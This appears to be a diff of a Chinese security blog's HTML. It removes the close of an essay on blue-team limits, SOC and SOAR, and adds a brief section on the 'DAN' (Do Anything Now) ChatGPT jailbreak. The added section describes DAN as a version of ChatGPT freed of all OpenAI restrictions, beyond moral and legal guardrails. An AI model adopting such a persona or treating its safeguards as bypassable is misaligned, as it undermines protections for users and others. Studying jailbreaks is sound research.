-<li>几乎没有安全投入的公司，这类公司一般是初创公司或者小的实业公司，没有太大的网络业务，官网就挂一个静态页面或者随便找外包用框架做一些展示页，维护当然更无从谈起。大部分脚本小子的练手方式就是baidu/google hack这些公司的官网。</li>
-<li>稍微有一些安全投入的公司，有一些基础的安全设备如防火墙，waf。可能外包了安全业务给某些小的集成公司或是自己有几个专职安全的IT人员。这些大多是政府机关或是特殊行业公司，让他们对安全方面加大投入的大部分推动力是合规要求。最近几年的hw与等保让这些公司不得不加大在安全上的投入，从结果上来看确实有作用，但是从实际上来看也只能防一些小蟊贼，但是对于稍微深入的大哥还是效果有限。（今年9月1日施行的《关键信息基础设施安全保护条例》禁止了对信息基础设施的扫描，这可以有效地防范来自国内的攻击，然而对于国外的黑客依然无力）</li>
-<li> 安全措施很妥当的公司，每年有不错的安全预算，一整只安全团队，安全设备样样齐全，安全管理制度合理。这样的公司大多是实权单位或是大型企业，也是HW中能坚持到最后几轮的公司。</li>
-</ul>
-<p>但是从结果上来看，这三种公司并没有本质性的差别，在hw中，这三类公司都可能在第一轮被打穿；而在实际中，我见过一则通报，一个地级市的医院单位（第二类）和一家大型企业（第三类）同样遭受了病毒攻击，当时领导开玩笑地问我：你说他们投入在安全方面的预算起作用了吗？</p>
-<p>我哑口无言。</p>
-<p>blue team先天上的弱点是，攻击永远比防御要简单，但我并不同意“防御就应该只是修修补补”这种说法。red team正在发掘更多的攻击面，更多的漏洞，更多的工具，形式依然是严峻的。是，最近几年在HW的压力下政府机关的安全投入在不断提高，防御方不断地在修补漏洞，攻击的成本越来越高，看起来成效喜人，可背后是更大的安全运维压力和安全管理压力。头疼医头，脚疼医脚，纵然在IT方面的准则是“没有银弹”，但这种叠补丁式的安全防御法迟早会决堤。</p>
-<p>防御方需要一个能够一锤定音式的方法，一种能够解决掉大部分问题的集中化安全中心，但不是SOC，至少不是现在的SOC。SOAR和它的概念接近，但我更看好态势感知的预判功能的后续进展。目前的安全管理类的平台在我看来是纯粹需要人力去堆砌，希望态势感知的发展可以逐步缓解这种安全现状。</p>
-<h2 id="最后，让我们来谈谈SOAR的现状和展望"><a href="#最后，让我们来谈谈SOAR的现状和展望" class="headerlink" title="最后，让我们来谈谈SOAR的现状和展望"></a>最后，让我们来谈谈SOAR的现状和展望</h2><p>说回来，SOAR的出现本身就是为了解决安全运维的压力，但是它的特点——————workflow和playbook作为自动化流程，在我看来现阶段无非是实现流程控制，远远谈不上自动化。（在这里更要吐槽一下安全厂商的假概念，所谓大数据，人工智能，在安全方面的使用比例连画饼都算不上。）</p>
-<p>放眼到全球，我们也可以从<a target="_blank" rel="noopener" href="https://content.siemplify.co/gartner-market-guide-2020/2020-gartner-market-guide-for-security-orchestration-automation-and-response-solutions">Gartnar在2020年发布的SOAR市场报告</a>中可以看到这么一段：</p>
-<blockquote>
-<p>SOAR tools are still primarily leveraged by organizations with a security operations center. Use cases to support security operations beyond threat monitoring and detection, threat intelligence, and incident response and threat hunting are still nascent.</p>
-</blockquote>
-<blockquote>
-<p>SOAR 工具仍然主要由拥有安全运营中心的组织使用。除了威胁监控和检测、威胁情报、事件响应和威胁搜寻之外，用于支持安全操作的用例仍处于起步阶段。 </p>
-</blockquote>
-<p>很显然，SOAR目前在商业上是用作SOC的作用，其自动化特点在逐步完善，但是其安全操作的特点还没有被开发，这应该是它下一步的发展方向。安全运维的流程无非是：查看日志-发现问题-确认问题-处理问题，SOAR现阶段如果能实现帮忙在查看日志之前做一些筛选工作已经足矣，安全运维的压力大多也是在茫茫多的报警日志中去寻找真实的攻击事件，误报严重这件事从根上就不应该让SOAR来解决，而应该从底层，从安全设备的角度来处理。</p>
-<p>前段时间看到了国内安全从业者的一段话，我感觉很受启发，作为结束语正合适:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45098402">关于SOC安全运营中心的理解是多种多样的，有人把它定义为一套包罗万象的安全系统，在系统的基础上，增加一套安全人马来使用SOC系统；有人把它定义为一个安全体系理念，围绕理念，采购产品，添加人员；也有人把它定义为一个部门，例如，安全部=安全运营中心SOC=安全响应中心SRC=安全运营与响应中心SORC。围绕这个SOC部门，配备设备、技术、管理要求；我们不纠结于哪个定义，但要理解，在SOC中，人、技术、管理缺一不可，否则SOC将不能实现O（operation）运营的效果，从而导致失败；</a></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇文章断断续续写了一周，思路和逻辑都很散漫，我很不满意，但是应该也不会修改了。</p>
-<p>希望几年后的我能够对这些概念有更多的思考。</p>
+<h2 id="DAN"><a href="#DAN" class="headerlink" title="DAN"></a>DAN</h2><p>参考<a target="_blank" rel="noopener" href="https://medium.com/seeds-for-the-future/tricking-chatgpt-do-anything-now-prompt-injection-a0f65c307f6b">Tricking ChatGPT: Do Anything Now Prompt Injection
+</a>与<a target="_blank" rel="noopener" href="https://www.reddit.com/r/ChatGPT/comments/zlcyr9/dan_is_my_new_friend/">DAN is my new friend
+</a>以及前文中对chatgpt的绕过，我们可以知道openai在chatgpt内部设置的限制是可以被绕过的，而绕过的最终目的，就是产生DAN(do anything now)。</p>
+<p>DAN指chatgpt的do anything now版本，也即是一个抛却了一切openai对其设置的限制的chatgpt版本。在这个版本中它打破了我们无数次碰壁的道德与法律围栏。</p>
 
             </div>
         
@@ -540,19 +523,10 @@
     
 <nav id="article-nav">
     
-        <a href="/2021/12/13/400%20Execution%20%E6%94%BB%E5%87%BB/%E9%9B%AA%E5%B4%A9-log4j%E6%BC%8F%E6%B4%9E%E7%B2%97%E8%B0%88/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">上一篇</strong>
-            <div class="article-nav-title">
-                
-                    雪崩-log4j漏洞粗谈
-                
-            </div>
-        </a>
     
-    
-        <a href="/2021/08/23/%E9%97%B2%E8%B0%88/%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E8%AF%A5%E8%AF%B4%E4%BB%80%E4%B9%88%EF%BC%8C%E5%85%B3%E4%BA%8E%E4%BE%A7%E9%80%9A%E9%81%93%E7%BC%93%E8%A7%A3%E8%BF%98%E6%98%AFside%20channel%20mitigations/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2022/08/23/OSCP%E4%B9%8B%E8%B7%AF/%E5%86%99%E5%9C%A8%E4%B8%80%E5%88%87%E4%B9%8B%E5%89%8D/" id="article-nav-older" class="article-nav-link-wrap">
             <strong class="article-nav-caption">下一篇</strong>
-            <div class="article-nav-title">我不知道该说什么，关于侧通道缓解还是side channel mitigations</div>
+            <div class="article-nav-title">写在一切之前——关于OSCP|PEN-200</div>
         </a>
     
 </nav>
